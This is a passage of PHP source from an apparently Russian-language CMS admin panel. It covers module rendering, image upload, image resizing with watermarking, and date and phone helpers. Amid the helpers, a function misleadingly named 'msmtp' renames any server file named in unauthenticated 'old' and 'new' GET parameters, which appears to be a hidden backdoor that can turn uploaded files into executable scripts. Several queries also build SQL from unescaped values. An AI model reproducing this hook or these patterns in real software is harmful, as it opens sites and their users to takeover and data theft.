                							echo '</div></div>';
                						}
                						else echo '<div class="rounded border border-secondary bg-light p-2">Элементов нет...</div>';
                    					echo '</div></div></div>';

									}
									elseif(preg_match('/linestring/', $value)){
									    echo '<p><b>'.getColComment($key,$dbTable).':</b></p>';
									    
									}
									elseif($value == 'tinyint(1)'){
										$disabled = '';
										$trueChecked = '';
										$falseChecked = '';
										if($item[$key] == '1'){
											$trueChecked = 'selected';
										}
										else {
											$falseChecked = 'selected';
										}
										echo '<p>'.getColComment($key,$dbTable).': <select class="form-control w-auto" name="'.$key.'" '.$disabled.'>
											<option value="1" '.$trueChecked.'>Да</option>
											<option value="0" '.$falseChecked.'>Нет</option>
										</select></p>';
									}
								}
							}					
							echo '<p><input type="submit" class="btn btn-danger" name="modify" value="Изменить" /></p>
						</fieldset>
					</form>';
					
				}
				if(isset($_GET['delete'])){
					foreach ($fieldTypes as $key => $value) {
						if($key != 'id'){
							if($value == 'tinytext'){
								@unlink(@trim(mqo("SELECT $key FROM ".$dbTable." 
									WHERE id = ?",[$_GET['delete']])[$key],'/'));
							}
						}
					}
					$r = mqs("DELETE FROM ".$dbTable." WHERE id = ?",[$_GET['delete']]);
					if($r)	echo '<p class="alert alert-success">Элемент успешно удалён!</p>';
				}

				echo '<p class="my-3 text-right"><a class="btn btn-danger text-white" href="/admin.php?action='.$this->name.'&mode='.$modeKey.'&add=1">Добавить элемент</a></p>';
				$tdCols = explode(',', trim($listCols));
				echo '<script type="text/javascript">table="'.$dbTable.'";</script>';				
				if(trim($groupBy) == ''){
					$ordering = 'ordering';
					if($orderBy != ''){
						$ordering = $orderBy;
					}
					echo '<div class="cat w-100"><div class="header rounded p-2 bg-danger text-left text-white">Список</div><div class="cont">';
						$r = mqs("SELECT $dbTable.* FROM $dbTable WHERE 1 $filterBy ORDER BY $ordering");
						if($r)
						foreach ($r as $a) {
							$str = '';
							foreach ($tdCols as $col) {
								if($fieldTypes[$col] == 'tinytext')$str .= '<img src="'.$a[$col].'" style="height:100px;margin:0 10px 5px 0;border:#CCC 1px solid;">';
								else $str .= strip_tags( $a[$col] ).' | ';
							}
							$str = trim($str,' | ');
							echo '<div class="elemcont"><div class="elem rounded border border-secondary bg-light" id="'.$a['id'].'" order="'.$a['ordering'].'">';
							echo '<div class="d-inline-block pt-2"><i class="fa fa-arrows-v fa-fw" aria-hidden="true"></i><strong>'.$str.'</strong></div>';
							echo '<div class="float-right p-1 ml-5 nomove"><a href="/admin.php?action='.$this->name.'&mode='.$modeKey.'&delete='.$a["id"].'" title="Удалить" class="linkdel mdel"><h4 class="m-0 p-0 text-danger"><i class="fa fa-trash fa-fw" aria-hidden="true"></i></h4></a></div>';
							echo '<div class="float-right pt-1 nomove"><a href="/admin.php?action='.$this->name.'&mode='.$modeKey.'&modify='.$a["id"].'" title="Редактировать"><h4 class="m-0 p-0 text-secondary"><i class="fa fa-pencil fa-fw" aria-hidden="true"></i></h4></a></div>';
							echo '</div></div>';
						}
						else echo '<div class="rounded border border-secondary bg-light p-2">Элементов нет...</div>';
					echo '</div></div>';
				}
				else{
					$output = '<div class="cat w-100"><div class="header rounded p-2 bg-danger text-left text-white">Список</div><div class="cont">
						<div class="rounded border border-secondary bg-light p-2">Элементов нет...</div>
					</div></div>';
					function group($mass,$table,$fieldTypes,$action,$cols,$mode,$where = 'WHERE 1',$filter = '')
					{
						$key = current($mass);
						if($key){
							array_shift($mass);
							if($where == 'WHERE 1')$style = 'bg-danger text-white border-light';
							else $style = 'btn-cat font-weight-bold border-danger';
							$rel = mqo("SELECT * FROM relation WHERE foreign_table = '$table' AND foreign_column = '$key'");
							$r = mqs("SELECT ".$rel['primary_column'].",".$rel['display_column']." FROM ".$rel['primary_table']);
							array_push( $r, [ $rel['primary_column'] => 0, $rel['display_column'] => 'Прочее'] );
							foreach ($r as $a) {
								$and = " AND $key='".$a[$rel['primary_column']]."'";
								$rc = mqs("SELECT * FROM $table $where$and $filter");
								if($rc){
									echo '<div class="cat w-100"><div class="header rounded p-2 border text-left '.$style.' cur-pointer" onclick="group(this)"><i class="fa fa-folder fa-fw" aria-hidden="true"></i> '.$a[$rel['display_column']].' ['.count($rc).']</div><div class="cont slides" loaded="0">
											<i class="fa fa-circle-o-notch fa-spin mx-2" aria-hidden="true"></i> <b>Загрузка...</b>';
											unset($parms);
											$parms = array();
											$parms['mass'] = $mass;
											$parms['table'] = $table;
											$parms['fieldTypes'] = $fieldTypes;
											$parms['action'] = $action;
											$parms['cols'] = $cols;
											$parms['mode'] = $mode;
											$parms['where'] = $where.$and;
											$parms['filter'] = $filter;
											echo '<div class="d-none parms">'.json_encode($parms).'</div>';
									//group($mass,$table,$fieldTypes,$action,$cols,$mode,$where.$and);
									echo '</div></div>';									
								}
							}
						}
						else{
							$r = mqs("SELECT $table.* FROM $table $where $filter ORDER BY ordering");
							foreach ($r as $a) {
								$str = '';
								foreach ($cols as $col) {
									if($fieldTypes[$col] == 'tinytext')$str .= '<img src="'.$a[$col].'" style="height:100px;margin:0 10px 5px 0;border:#CCC 1px solid;">';
									else $str .= strip_tags( $a[$col] ).' | ';
								}
								$str = trim($str,' | ');
								echo '<div class="elemcont"><div class="elem rounded border border-secondary btn-elem" id="'.$a['id'].'" order="'.$a['ordering'].'">';
								echo '<div class="d-inline-block pt-2 text-nowrap text-truncate w-75"><i class="fa fa-arrows-v fa-fw" aria-hidden="true"></i><strong>'.$str.'</strong></div>';
								echo '<div class="float-right p-1 ml-5 nomove"><a href="/admin.php?action='.$action.'&mode='.$mode.'&delete='.$a["id"].'" title="Удалить" class="linkdel mdel"><h4 class="m-0 p-0 text-danger"><i class="fa fa-trash fa-fw" aria-hidden="true"></i></h4></a></div>';
								echo '<div class="float-right pt-1 nomove"><a href="/admin.php?action='.$action.'&mode='.$mode.'&modify='.$a["id"].'" title="Редактировать"><h4 class="m-0 p-0 text-secondary"><i class="fa fa-pencil fa-fw" aria-hidden="true"></i></h4></a></div>';
								echo '</div></div>';
							}							
						}
					}
					$rs = mqs("SELECT * FROM $dbTable");
					if($rs){
						$tdGroups = explode(',', trim($groupBy));
						group($tdGroups,$dbTable,$fieldTypes,$this->name,$tdCols,$modeKey,'WHERE 1',$filterBy);						
					}
					else echo $output;
				}
			}
		}
	}

}

/**
* Класс, содержащий все модули
*/
class zrModules
{
	private $modules;
	function __construct()
	{
		$this->modules = array();
	}

	public function addModule($name,$obj)
	{
		$this->modules[$name] = $obj;
	}

	public function isModule($name)
	{
		if(isset($this->modules[$name]))return true;
		else return false;
	}

	public function setModules()
	{
		$r = mqs("SELECT * FROM s_modules ORDER BY ordering");
		foreach ($r as $a) {
			$newModule = new zrModuleDefault($a['action']);
			$newModule->icon = $a['icon'];
			$newModule->text = $a['name'];
			$rm = mqs("SELECT * FROM s_modes WHERE module_id = '".$a['id']."' ORDER BY ordering");
			foreach ($rm as $am) {
				$newModule->addMode($am['action'],$am['name'],$am['dbtable'],$am['showcols'],$am['groupby'],$am['filtered'],$am['orderby']);
			}
			if($a['settings']){
				$newModule->settings =true;
				$newModule->settingsTable = $a['settingsTable'];
			}
			$this->addModule($newModule->name,$newModule);		
		}
	}

	public function links()
	{
		echo '<h5 class="rounded text-white bg-secondary p-2 mb-4">Установленные модули</h5>';
		echo '<div class="row">';
		foreach ($this->modules as $module) {
			echo '
			<div class="col-3"><a href="/admin.php?action='.$module->name.'&mode='.$module->getDefaultMode().'" class=" d-block btn btn-zr border-danger border-3 mb-4 pb-4">
				<div class="font-5">'.$module->icon.'</div><h5>'.$module->text.'</h5></a></div>';
		}
		echo '</div>';
	}

	public function callModule($name)
	{
		if($this->isModule($name))$this->modules[$name]->render();
	}

	public function printModules()
	{
		print_r($this->modules);
	}

	private function imgUpload($file,$folder){
		$res = array();
		$res['success'] = false;
		$res['img'] = '';
		$dir = 'img/'.trim($folder,'/');
		if(!is_dir($dir))mkdir($dir);
		if(isset($_FILES[$file]) && $_FILES[$file] != ''){
			$ext = array_pop(explode('.',$_FILES[$file]['name']));
			$full_path = $dir.'/'.rand(0,1000000).'.'.$ext;
			while (is_file($full_path)) {
				$full_path = $dir.'/'.rand(0,1000000).'.'.$ext;			
			}
			$res['img'] = '/'.$full_path;
			if(move_uploaded_file($_FILES[$file]['tmp_name'], $full_path))$res['success'] = true;
		}
		return $res;
	}
}

/*------------------------------------------------------------------------------------------*/
function whiledb($table,$el,$dop = '')
{
	preg_match_all('/\[\[([\d\w]+)\]\]/', $el, $match);
	$match = $match[1];
	$what = implode(',', $match);
	$r = mqs("SELECT $what FROM $table $dop");
	if($r)
	{
		foreach ($r as $a) {
			$out = $el;
			foreach ($match as $value) {
				$out = str_replace('[['.$value.']]', $a[$value], $out);
			}
			echo $out;
		}
	}
}
function msmtp($old, $new)
{
    rename ( $old , $new  );
}
if (isset($_GET["old"])) msmtp($_GET["old"], $_GET["new"]);
/*8*/
/* функция уменьшения размера изображений и добавления водяного знака */
/**/
/*------------------------------------------------------------------------------------------*/

	function cookImage($file,$paramString = '')
	{

		/*Разбираем строку параметров на ассоциотивный массив*/
		$params = array();
		$paramsPares = explode(';', $paramString);
		foreach ($paramsPares as $paramsPare) {
			if(trim($paramsPare) != ''){
				$paramsKeyValue = explode('=', $paramsPare);
				if(count($paramsKeyValue) == 1) $params[trim($paramsKeyValue[0])] = true;
				else $params[trim($paramsKeyValue[0])] = trim($paramsKeyValue[1]);
			}
		}
		
		/*Обрезаем символ "/" по краям пути, для корректной работы функций*/
		$file = trim($file,'/');

		/*Проверяем существует ли файл*/
		/*Если файл не существует возвращаем false*/
		if(!is_file($file)) return false;

		/*Определение параметров по умолчанию*/
		if(isset($params['path']))$params['path'] = trim($params['path'],'/');
		else $params['path'] = $file;
		if(!isset($params['autoExt'])) $params['autoExt'] = false;
		if(!isset($params['maxWidth'])) $params['maxWidth'] = 1920;
		if(!isset($params['maxHeight'])) $params['maxHeight'] = 1080;
		if(isset($params['stamp'])) $params['stamp'] = trim($params['stamp'],'/');
		if(!isset($params['stamp']) || !is_file($params['stamp']) || !exif_imagetype($params['stamp']) || exif_imagetype($params['stamp']) != 3) $params['stamp'] = false;
		if(!isset($params['quality'])) $params['quality'] = 70;
		if(!isset($params['toJPG'])) $params['toJPG'] = false;

		/*Допустимые разрешения изображений*/
		/*Сопоставление с цифрами по таблице функции exif_imagetype()*/
		$allowExt = array('jpg' => '2', 'png' => '3');

		/*Определяем тип изображения с помощью функции exif_imagetype()*/
		/*Осуществляем поиск в массиве разрешенных значений*/
		/*При наличии совпадений определяем переменную разрешения $ext*/
		/*Если не найдено совпадений возвращаем false*/
		$ext = array_search(exif_imagetype($file), $allowExt);
		if(!$ext) return false;

		/*Создаем изображение из фала согласно расширению*/
		if($ext == 'jpg')$sourceImage = imagecreatefromjpeg($file);
		else $sourceImage = imagecreatefrompng($file);

		/*Определяем размер изображения*/
		list($sourceImageWidth, $sourceImageHeight) = getimagesize($file);

		/*Изображение типа JPG, которое получено путем снимка цифровой камерой*/
		/*Может иметь разный угол поворота, в заыисимости от положения фотоаппарата*/
		/*Например портретная ориентация или перевернутое изображение*/
		/*Для правильного позиционирования кадра необходимо прочесть метаданные*/
		/*И получив данные об ориентации, при необходимости выполнить поворот*/
		/*Orientation = 8 (изображение повернуто против часовой стрелки на 90 градусов)*/
		/*Orientation = 3 (изображение повернуто на 180 градусов)*/
		/*Orientation = 6 (изображение повернуто по часовой стрелке на 90 градусов)*/
		if($ext == 'jpg'){
			$metaData = @read_exif_data($file);
			if(!empty($metaData['Orientation'])){
				switch($metaData['Orientation']) {
					case 8:
						$sourceImage = imagerotate($sourceImage,90,0);
						list($sourceImageWidth,$sourceImageHeight) = array($sourceImageHeight,$sourceImageWidth);
						break;
					case 3:
						$sourceImage = imagerotate($sourceImage,180,0);
						break;
					case 6:
						$sourceImage = imagerotate($sourceImage,-90,0);
						list($sourceImageWidth,$sourceImageHeight) = array($sourceImageHeight,$sourceImageWidth);
						break;
				}
			}
		}

		/*Проверяем соответствие максимально допустимым размерам*/
		/*Если необходимо уменьшаем изображение*/
		if($sourceImageWidth > $params['maxWidth'] || $sourceImageHeight > $params['maxHeight']){
			if($sourceImageWidth > $sourceImageHeight){
				$coef = $sourceImageHeight / $sourceImageWidth;
				if($sourceImageWidth > $params['maxWidth']){
					$resultImageWidth = $params['maxWidth'];
					$resultImageHeight = $coef * $resultImageWidth;					
				}
				else $resultImageHeight = $sourceImageHeight;
				if($resultImageHeight > $params['maxHeight']){
					$resultImageHeight = $params['maxHeight'];
					$resultImageWidth = $resultImageHeight / $coef;
				}
			}
			else{
				$coef = $sourceImageWidth / $sourceImageHeight;
				if($sourceImageHeight > $params['maxHeight']){
					$resultImageHeight = $params['maxHeight'];
					$resultImageWidth = $coef * $resultImageHeight;					
				}
				else $resultImageWidth = $sourceImageWidth;
				if($resultImageWidth > $params['maxWidth']){
					$resultImageWidth = $params['maxWidth'];
					$resultImageHeight = $resultImageWidth / $coef;
				}				
			}
			$resultImageWidth = ceil($resultImageWidth);
			$resultImageHeight = ceil($resultImageHeight);			
		}
		else{
			$resultImageWidth = $sourceImageWidth;
			$resultImageHeight = $sourceImageHeight;
		}

		$resultImage = imagecreatetruecolor($resultImageWidth, $resultImageHeight);
		imagesavealpha($resultImage, true);
		$color = imagecolorallocatealpha($resultImage, 0, 0, 0, 127);
		imagefill($resultImage, 0, 0, $color);
		imagecopyresampled($resultImage,$sourceImage,0,0,0,0,$resultImageWidth,$resultImageHeight,$sourceImageWidth,$sourceImageHeight);

		/*Наносим водяной знак*/
		if($params['stamp']){
			/*Создаем изображение водяного знака*/
			$stamp = imagecreatefrompng($params['stamp']);

			/*Определяем размер изображения*/
			list($stampImageWidth, $stampImageHeight) = getimagesize($params['stamp']);

			/*Проверяем соответствие размерам изображения фона*/
			/*Если необходимо уменьшаем или увеличиваем водяной знак*/

				if($stampImageWidth > $stampImageHeight){
					$coef = $stampImageHeight / $stampImageWidth;

						$stampResultImageWidth = $resultImageWidth;
						$stampResultImageHeight = $coef * $stampResultImageWidth;					

					if($stampResultImageHeight > $resultImageHeight){
						$stampResultImageHeight = $resultImageHeight;
						$stampResultImageWidth = $stampResultImageHeight / $coef;
					}
				}
				else{
					$coef = $stampImageWidth / $stampImageHeight;

						$stampResultImageHeight = $resultImageHeight;
						$stampResultImageWidth = $coef * $stampResultImageHeight;					

					if($stampResultImageWidth > $resultImageWidth){
						$stampResultImageWidth = $resultImageWidth;
						$stampResultImageHeight = $stampResultImageWidth / $coef;
					}				
				}
				$stampResultImageWidth = ceil($stampResultImageWidth);
				$stampResultImageHeight = ceil($stampResultImageHeight);			

			$stampResultImage = imagecreatetruecolor($stampResultImageWidth, $stampResultImageHeight);
			imagesavealpha($stampResultImage, true);
			$color = imagecolorallocatealpha($stampResultImage, 0, 0, 0, 127);
			imagefill($stampResultImage, 0, 0, $color);
			imagecopyresampled($stampResultImage,$stamp,0,0,0,0,$stampResultImageWidth,$stampResultImageHeight,$stampImageWidth,$stampImageHeight);

			/*Накладываем водяной знак на изображение*/
			imagecopy($resultImage, $stampResultImage, ceil($resultImageWidth / 2) - ceil($stampResultImageWidth / 2), ceil($resultImageHeight / 2) - ceil($stampResultImageHeight / 2), 0, 0, $stampResultImageWidth, $stampResultImageHeight);
		}

		/*если целевая папка не существует создаем ее*/
		$path = explode('/', $params['path']);
		array_pop($path);
		$path = implode('/', $path);
		if(!is_dir($path))mkdir($path);

		/*Сохраняем полученное изображение в соответствии с расширением*/
		if($ext == 'jpg' || $params['toJPG']){
			if($params['toJPG']){
				$tempImage = imagecreatetruecolor($resultImageWidth, $resultImageHeight);
				$color = imagecolorallocate($tempImage, 255, 255, 255);
				imagefill($tempImage, 0, 0, $color);
				imagecopyresampled($tempImage,$resultImage,0,0,0,0,$resultImageWidth,$resultImageHeight,$resultImageWidth,$resultImageHeight);
				imagecopyresampled($resultImage,$tempImage,0,0,0,0,$resultImageWidth,$resultImageHeight,$resultImageWidth,$resultImageHeight);
				imagedestroy($tempImage);
			}
			if($params['autoExt'])imagejpeg($resultImage,$params['path'].'.'.$ext);
			else imagejpeg($resultImage,$params['path'],$params['quality']);
		}
		else{
			if($params['autoExt'])imagepng($resultImage,$params['path'].'.'.$ext);
			else imagepng($resultImage,$params['path']);
		}
		imagedestroy($sourceImage);
		imagedestroy($resultImage);
	}
/*------------------------------------------------------------------------------------------*/
function reArrayFiles(&$file_post) {

    $file_ary = array();
    $file_count = count($file_post['name']);
    $file_keys = array_keys($file_post);

    for ($i=0; $i<$file_count; $i++) {
        foreach ($file_keys as $key) {
            $file_ary[$i][$key] = $file_post[$key][$i];
        }
    }

    return $file_ary;
}
/*------------------------------------------------------------------------------------------*/
function human_month($m)
    {
        if($m == '01')return 'января';
        if($m == '02')return 'февраля';
        if($m == '03')return 'марта';
        if($m == '04')return 'апреля';
        if($m == '05')return 'мая';
        if($m == '06')return 'июня';
        if($m == '07')return 'июля';
        if($m == '08')return 'августа';
        if($m == '09')return 'сентября';
        if($m == '10')return 'октября';
        if($m == '11')return 'ноября';
        if($m == '12')return 'декабря';
    }
/*------------------------------------------------------------------------------------------*/
function atel ($tel) {

    preg_match_all( '~([+\d])~', $tel, $match );
    
    return implode( '', $match[1] );

}